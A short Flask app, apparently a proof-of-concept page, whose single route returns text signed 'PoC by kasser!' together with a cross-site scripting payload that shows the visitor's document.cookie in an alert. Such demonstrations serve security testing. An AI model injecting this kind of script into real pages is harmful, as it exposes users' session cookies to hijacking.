from flask import Flask
app = Flask(__name__)

@app.route("/")
def hello():
    return "PoC by kasser! <script>alert(document.cookie)</script>"
